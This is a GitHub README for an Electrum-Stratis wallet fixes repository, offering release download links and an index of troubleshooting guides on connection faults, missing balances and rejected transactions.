![Electrum-Stratis](assets/banner-hub.png)

# Electrum-Stratis wallet fixes

<p align="center">Connection, balance and transaction fixes</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions and checksums are on the [v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

---

These guides cover the failures that arrive after a successful install: a wallet that says it is not connected, a node sitting at zero peers, a balance that will not appear and a transaction the network refuses. The common thread is that the wallet is usually working correctly against a bad input, so the fix starts with identifying which input is wrong.

Connection faults are separated from balance faults on purpose. A wallet with no peer cannot see the chain and will show nothing; a wallet with a peer that is behind will show an old view and look confident about it. Those two need different remedies, and the guides name the check that tells them apart before offering either.

Transaction rejections get the same treatment: the message names the rule that was broken, and each rule maps to one condition you can verify. A rejection is never a lost coin; it is the network declining to relay, and the balance stays where it was. Every guide assumes the wallet is current; when it is not, the first paragraph says which of the two is missing.

Before changing any setting, note the version in the About window and the server the health panel names. Those two facts decide whether a fix applies at all, and they turn a vague report into something a maintainer can act on. Nothing in this section asks for a seed, a private key or a wallet file.

## Start here

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Why does Electrum Stratis say Not Connected?](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/wallet-says-not-connected.md) | peer connection |
| [Why is my balance missing? Three causes, and how to tell them apart](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/balance-is-missing.md) | three causes |
| [bad-txns-inputs-spent, and the other reasons a send is rejected](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/transaction-was-rejected.md) | five rejections |

</div>


## Connection

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Why does Electrum Stratis say Not Connected?](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/wallet-says-not-connected.md) | peer connection |
| [The server list and the cloud node: choosing a peer that works](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/the-server-list-explained.md) | probe and reorder |
| [The Use SSL toggle: what it does, and why turning it off is not a fix](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/the-use-ssl-toggle.md) | what it costs |
| [Restored from seed and still not connected: what the restore did and did no...](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/restored-but-still-offline.md) | restore versus connection |
| [STRAX wallet for Windows not syncing: this wallet cannot hold STRAX](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/strax-wallet-will-not-sync.md) | wrong chain |

</div>


## Balance and chain view

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Why is my balance missing? Three causes, and how to tell them apart](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/balance-is-missing.md) | three causes |
| [Core with zero peers: Processed 0 out of 0 blocks](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/core-shows-zero-peers.md) | empty queue |
| [Synced but 170,000 blocks behind: the stale peer](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/synced-to-a-stale-peer.md) | height and age |

</div>


## Transactions

<div align="center">

| Guide | What it answers |
| --- | --- |
| [bad-txns-inputs-spent, and the other reasons a send is rejected](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/transaction-was-rejected.md) | five rejections |

</div>


## More guides

- [Electrum-Stratis guides](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/README.md)
- [Electrum-Stratis recovery guides](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/README.md)

## About

Electrum-Stratis is a self-custody desktop wallet for the legacy Stratis chain, forked from Electrum and released under the MIT licence.

MIT licensed. No page in this repository asks for a seed or a private key.
